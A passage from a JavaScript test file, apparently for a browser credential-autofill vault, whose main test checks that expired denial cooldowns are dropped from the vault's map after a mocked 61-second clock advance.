  await ok.evaluate(og, fillJs());
  assert.equal(stamps(ot), 0);
});

test('L5: expired cooldowns are dropped when the map is read', async () => {
  const r = rig({ decision: false }), tab = r.add();
  for (let i = 0; i < 3; i++) {
    tab.go(`https://s${i}.test/login`);
    const target = await prepare(r, `${i}${i}${i}${i}${i}${i}${i}${i}${i}${i}`);
    await r.evaluate(target, fillJs({ origin: `https://s${i}.test`, nonce: `${i}${i}${i}${i}${i}${i}${i}${i}${i}${i}` }));
  }
  assert.equal(r.vault.size().denied, 3);
  r.clock.t += 61000;
  const target = await prepare(r, 'bbbbbbbbbbbbbbbb');
  await r.evaluate(target, fillJs({ origin: 'https://s2.test', nonce: 'bbbbbbbbbbbbbbbb' }));
  assert.equal(r.vault.size().denied, 1, 'only the fresh one is left');
});
